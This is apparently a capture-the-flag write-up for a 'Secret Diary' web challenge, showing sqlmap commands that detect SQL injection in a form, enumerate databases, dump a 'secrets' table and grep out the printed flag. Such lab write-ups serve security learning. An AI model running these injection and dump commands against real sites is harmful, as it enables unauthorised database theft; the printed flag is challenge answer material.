# Secret Diary

## Description

I created a website where everyone can store their secrets. I have some confidential data here, but I am sure you can't see it.

Get the flag from [http://141.85.224.127:12000/](http://141.85.224.127:12000/).

## Solution

We use sqlmap to detect for any injections and also scan for the available databases:

```bash
sqlmap -u "http://141.85.224.127:12000/index.php" --dbs --forms --crawl=2
```

We find these:

```bash
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] secrets
[*] sys
```

Intuitively, we start by checking the secrets db:

```bash
sqlmap -u "http://141.85.224.127:12000/index.php" -D secrets --tables --forms --crawl=2
```

We find only one table:

```bash
Database: secrets
[1 table]
+---------+
| secrets |
+---------+
```

Looking further inside the table:

```bash
sqlmap -u "http://141.85.224.127:12000/index.php" -D secrets -T secrets --dump --forms --crawl=2
```

It has a lot of entries so we grep the flag there:

```bash
cat /home/kali/.local/share/sqlmap/output/141.85.224.127/dump/secrets/secrets.csv | grep SSS
```

## Flag

`SSS{u1tr4_m3g4_t0p_s3cr3t}`
